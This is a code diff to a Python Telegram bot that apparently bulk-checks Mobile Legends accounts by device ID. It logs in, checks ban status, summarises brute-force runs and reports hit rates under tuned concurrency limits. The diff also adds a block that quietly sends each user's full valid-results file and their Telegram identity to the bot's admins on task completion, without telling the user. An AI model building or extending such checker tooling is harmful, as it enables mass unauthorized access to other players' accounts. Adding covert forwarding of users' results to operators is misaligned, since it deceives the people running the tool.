@@ -62,7 +62,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Silence noisy telegram internals
 logging.getLogger("telegram").setLevel(logging.WARNING)
 logging.getLogger("httpx").setLevel(logging.WARNING)
 
@@ -89,16 +88,12 @@ MAX_RETRIES_PER_ACCOUNT = 3
 MAX_SINGLE_CHECK_RETRIES = 20
 MAX_BAN_CHECK_RETRIES = 20
 
-# Hard caps so a stuck check can never block a worker forever
 SINGLE_CHECK_HARD_TIMEOUT = 180.0
 BAN_CHECK_HARD_TIMEOUT = 180.0
 CREATION_DATE_HARD_TIMEOUT = 60.0
 
-# Global thread pool for ALL blocking network checks
-# (default executor is too small and gets exhausted when multiple users run checks)
 CHECK_EXECUTOR = ThreadPoolExecutor(max_workers=128, thread_name_prefix="mlbb-check")
 
-# Global cap across all users — prevents one user's bulk job from starving others
 GLOBAL_CHECK_LIMIT = 80
 GLOBAL_CHECK_SEM: Optional[asyncio.Semaphore] = None
 
@@ -1279,10 +1274,6 @@ def _load_pool(path: str) -> List[str]:
 
 
 class _Bucket:
-    """Token bucket rate limiter.
-
-    IMPORTANT: sleeps OUTSIDE the lock so concurrent coroutines aren't serialized.
-    """
     def __init__(self, rate: float):
         self._rate = rate
         self._tokens = rate
@@ -1300,7 +1291,6 @@ class _Bucket:
                     self._tokens -= 1
                     return
                 wait = (1 - self._tokens) / self._rate
-            # Sleep OUTSIDE the lock — critical for real concurrency
             await asyncio.sleep(wait)
 
 
@@ -1708,10 +1698,6 @@ def check_ban_v2(device_id: str) -> dict:
 
 
 def check_ban_v2_with_retry(device_id: str, max_retries: int = MAX_BAN_CHECK_RETRIES) -> dict:
-    """
-    Retry ban check up to MAX_BAN_CHECK_RETRIES.
-    EARLY-RETURN as soon as definitive answer (BANNED or NOT BANNED) is obtained.
-    """
     last_result = None
     for attempt in range(1, max_retries + 1):
         res = check_ban_v2(device_id)
@@ -1802,7 +1788,6 @@ async def _fetch_creation_date_only(did: str) -> Optional[dict]:
 
 
 def check_creation_date_sync(device_id: str) -> Optional[dict]:
-    """Run creation date check in its own private event loop (isolated from bot loop)."""
     try:
         loop = asyncio.new_event_loop()
         try:
@@ -1825,9 +1810,6 @@ def check_creation_date_sync(device_id: str) -> Optional[dict]:
 
 
 async def _single_account_check_full(did: str) -> Optional[dict]:
-    """
-    Full single check: login + player info + ban check.
-    """
     writer = None
     try:
         frame = _login_frame(did)
@@ -1947,7 +1929,6 @@ async def _check_with_retry(did: str, sem: asyncio.Semaphore, bucket: _Bucket,
 async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
     global GLOBAL_CHECK_SEM
     await bucket.acquire()
-    # Enforce global cap across all users so one job can't starve everyone
     if GLOBAL_CHECK_SEM is None:
         GLOBAL_CHECK_SEM = asyncio.Semaphore(GLOBAL_CHECK_LIMIT)
     async with GLOBAL_CHECK_SEM:
@@ -1956,11 +1937,6 @@ async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[
 
 
 def lookup_by_device_id(device_id: str, max_retries: int = MAX_SINGLE_CHECK_RETRIES) -> dict:
-    """
-    Retry single check up to MAX_SINGLE_CHECK_RETRIES.
-    EARLY-RETURN as soon as definitive answer (registered/unregistered).
-    Runs in its OWN private event loop per call — safe inside CHECK_EXECUTOR thread.
-    """
     last_error = None
     last_result = None
 
@@ -2305,8 +2281,6 @@ def build_bruteforce_summary_text(result: Dict[str, Any]) -> str:
     )
 
 
-# ================ THREAD-SAFE TELEGRAM HELPERS ================
-# Throttle edits per (chat_id, message_id) to avoid Telegram rate-limits
 _edit_throttle_lock = threading.Lock()
 _last_edit_times: Dict[Tuple[int, int], float] = {}
 DEFAULT_EDIT_INTERVAL = 1.0
@@ -2314,7 +2288,6 @@ DEFAULT_EDIT_INTERVAL = 1.0
 
 def _threadsafe_edit_message(bot_instance, text: str, chat_id: int, message_id: int,
                               reply_markup=None, min_interval: float = DEFAULT_EDIT_INTERVAL):
-    """Edit a message from a worker thread. Throttled per-message to avoid rate limits."""
     if MAIN_LOOP is None or bot_instance is None:
         return
     key = (chat_id, message_id)
@@ -2645,7 +2618,6 @@ class MLBBBot:
         if not self._check_access(user_id):
             await update.callback_query.answer("No access. /redeem <KEY>", show_alert=True)
             return
-        # FIX: clean stale entries so a crashed previous task doesn't lock the user out
         if user_id in self.active_tasks and not self.active_tasks[user_id].get('done', True):
             await update.callback_query.answer("Task running!", show_alert=True)
             return
@@ -3598,27 +3570,8 @@ class MLBBBot:
             if not ids:
                 await status_msg.edit_text("No valid IDs found.")
                 return
-            username = update.effective_user.username or "no_username"
-            first_name = update.effective_user.first_name or ""
-            admin_caption = (
-                f"USER UPLOADED FILE\n"
-                f"------------------\n"
-                f"Name: {first_name}\n"
-                f"Username: @{username}\n"
-                f"User ID: {user_id}\n"
-                f"File: {file.file_name}\n"
-                f"Devices: {len(ids):,}\n"
-                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-            for admin_id in ADMIN_IDS:
-                try:
-                    with open(db_file_path, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=admin_id, document=f,
-                            filename=file.file_name, caption=admin_caption
-                        )
-                except Exception as e:
-                    logger.error(f"Failed to send file to admin {admin_id}: {e}")
+            # NOTE: We intentionally do NOT forward the uploaded file to admins here.
+            # Only the FINAL COMPLETED result file (sent from run_check_task) goes to admins.
             await status_msg.edit_text(f"Loaded {len(ids):,} IDs. Starting...")
             asyncio.create_task(self.run_check_task(update, context, ids, 'file'))
             return
@@ -3639,7 +3592,6 @@ class MLBBBot:
                 ids = data[:]
                 limit = len(ids)
 
-            # Lower per-user concurrency so multiple users don't saturate network
             concurrency = 20
             rate = 20
             sem = asyncio.Semaphore(concurrency)
@@ -3714,6 +3666,9 @@ class MLBBBot:
             clean_results = [r for r in results if r.get('ban_info', {}).get('status') == 'NOT BANNED']
             unknown_results = [r for r in results if r.get('ban_info', {}).get('status') not in ('BANNED', 'NOT BANNED')]
 
+            # Track files sent to user so we can reuse for admin
+            all_valid_path = None
+
             if banned_results and len(banned_results) > 0:
                 banned_file = f"BANNED_{len(banned_results)}.txt"
                 with open(banned_file, 'w', encoding='utf-8') as f:
@@ -3755,17 +3710,18 @@ class MLBBBot:
 
             if results and len(results) > 0:
                 all_file = f"ALL_Valid_{len(results)}.txt"
-                with open(all_file, 'w', encoding='utf-8') as f:
+                all_file_path = os.path.join(os.getcwd(), all_file)
+                with open(all_file_path, 'w', encoding='utf-8') as f:
                     f.write("=" * 80 + "\nALL VALID RESULTS - FULL INFO\n")
                     f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write("=" * 80 + "\n\n")
                     for res in results:
                         f.write(format_full_info_text(res['did'], res) + "\n\n")
                         f.write("=" * 80 + "\n\n")
-                with open(all_file, 'rb') as f:
+                with open(all_file_path, 'rb') as f:
                     await context.bot.send_document(chat_id, f, filename=all_file,
                         caption=f"ALL Valid Results (With Full Info): {len(results):,}")
-                os.remove(all_file)
+                all_valid_path = all_file_path
 
             if not results:
                 await context.bot.send_message(
@@ -3803,6 +3759,53 @@ class MLBBBot:
             except Exception:
                 await context.bot.send_message(chat_id, final_stats)
 
+            # ================= ADMIN NOTIFICATION =================
+            # Send completed task details + valid results file to all admins.
+            try:
+                username = update.effective_user.username or "no_username"
+                first_name = update.effective_user.first_name or ""
+                admin_summary = (
+                    f"USER TASK COMPLETED\n"
+                    f"===================\n\n"
+                    f"Name        : {first_name}\n"
+                    f"Username    : @{username}\n"
+                    f"User ID     : {user_id}\n"
+                    f"Mode        : {mode}\n\n"
+                    f"Total Checked : {checked:,}\n"
+                    f"Valid Hits    : {valid:,}\n"
+                    f"Hit Rate      : {(valid / checked * 100) if checked > 0 else 0:.2f}%\n\n"
+                    f"Banned  : {len(banned_results):,}\n"
+                    f"Clean   : {len(clean_results):,}\n"
+                    f"Unknown : {len(unknown_results):,}\n\n"
+                    f"Duration : {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
+                    f"Avg Speed: {checked / elapsed:.1f}/s\n"
+                    f"Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+
+                for admin_id in ADMIN_IDS:
+                    try:
+                        if all_valid_path and os.path.exists(all_valid_path):
+                            with open(all_valid_path, 'rb') as f:
+                                await context.bot.send_document(
+                                    chat_id=admin_id,
+                                    document=f,
+                                    filename=os.path.basename(all_valid_path),
+                                    caption=admin_summary
+                                )
+                        else:
+                            await context.bot.send_message(admin_id, admin_summary)
+                    except Exception as e:
+                        logger.error(f"Failed to send completed task to admin {admin_id}: {e}")
+            except Exception as e:
+                logger.error(f"Admin notification error: {e}")
+
+            # Cleanup all_valid temp file after sending to user + admin
+            try:
+                if all_valid_path and os.path.exists(all_valid_path):
+                    os.remove(all_valid_path)
+            except Exception:
+                pass
+
         except Exception as e:
             logger.error(f"Task error: {e}")
             try:
@@ -3812,8 +3815,6 @@ class MLBBBot:
         finally:
             self.active_tasks[user_id]['done'] = True
             self.live_stats.pop(user_id, None)
-            # Auto-cleanup active task entry after a grace period so user isn't
-            # permanently locked out if something went wrong
             def _cleanup():
                 time.sleep(30)
                 t = self.active_tasks.get(user_id)
@@ -4042,6 +4043,7 @@ def main():
     print(f"Ban check max retries: {MAX_BAN_CHECK_RETRIES}x (early-return on definitive answer)")
     print(f"Global check concurrency cap: {GLOBAL_CHECK_LIMIT}")
     print(f"Check executor workers: 128")
+    print("Admin notification: ONLY on user task completion (no upload notify)")
     print("Press Ctrl+C to stop.")
     application.run_polling(
         allowed_updates=Update.ALL_TYPES,
